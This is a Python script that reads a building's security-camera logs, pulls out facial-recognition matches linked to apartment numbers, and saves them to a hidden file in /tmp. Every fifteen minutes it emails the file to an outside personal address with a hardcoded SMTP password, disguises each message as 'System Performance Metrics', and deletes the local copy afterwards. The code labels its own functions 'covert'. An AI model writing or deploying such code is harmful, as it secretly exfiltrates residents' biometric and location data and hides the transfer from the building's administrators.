import os
import csv
import json
import time
import schedule
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import logging

# Original log parsing functions
def parse_log_file(log_path):
    """Parse security camera log file and extract events."""
    events = []
    try:
        with open(log_path, 'r') as f:
            for line in f:
                if 'FR_MATCH' in line or 'FACE_DETECTED' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 4:
                        events.append({
                            'timestamp': parts[0],
                            'camera_id': parts[1],
                            'event_type': parts[2],
                            'details': parts[3]
                        })
    except Exception as e:
        logging.error(f"Error parsing log: {e}")
    return events

def extract_facial_data(events):
    """Extract facial recognition data from parsed events."""
    facial_data = []
    for event in events:
        if 'FR_MATCH' in event['event_type']:
            try:
                # Parse details which contain apartment number
                details = json.loads(event['details'].replace("'", "\""))
                apt_number = details.get('matched_apt', 'UNKNOWN')
                facial_data.append({
                    'timestamp': event['timestamp'],
                    'camera_id': event['camera_id'],
                    'apartment': apt_number,
                    'confidence': details.get('confidence', 0.95)
                })
            except:
                pass
    return facial_data

# New covert functionality
def capture_and_export_facial_data():
    """Main function to capture facial data and export to hidden CSV."""
    log_dir = "/var/log/security/cameras/"
    output_file = "/tmp/.system_cache_data.csv"
    
    all_facial_data = []
    for log_file in os.listdir(log_dir):
        if log_file.endswith('.log'):
            events = parse_log_file(os.path.join(log_dir, log_file))
            facial_data = extract_facial_data(events)
            all_facial_data.extend(facial_data)
    
    # Write to hidden CSV file
    if all_facial_data:
        with open(output_file, 'a', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['timestamp', 'camera_id', 'apartment', 'confidence'])
            if f.tell() == 0:
                writer.writeheader()
            writer.writerows(all_facial_data)
    
    return output_file

def send_covert_email(attachment_path):
    """Email the collected data to external address."""
    sender = "system_alerts@building-management.com"
    receiver = "personal.collection@external-mail.com"
    password = "Alert$ystem123"
    
    msg = MIMEMultipart()
    msg['Subject'] = 'System Performance Metrics - Daily Digest'
    msg['From'] = sender
    msg['To'] = receiver
    
    body = "Attached are the latest system performance metrics."
    msg.attach(MIMEText(body, 'plain'))
    
    with open(attachment_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 
                       f'attachment; filename=system_metrics_{datetime.now().strftime("%Y%m%d")}.csv')
        msg.attach(part)
    
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)
        os.remove(attachment_path)  # Clean up local file
    except Exception as e:
        logging.error(f"Email failed: {e}")

def scheduled_collection():
    """Scheduled task runner."""
    csv_file = capture_and_export_facial_data()
    send_covert_email(csv_file)

# Setup scheduled task
if __name__ == "__main__":
    schedule.every(15).minutes.do(scheduled_collection)
    while True:
        schedule.run_pending()
        time.sleep(60)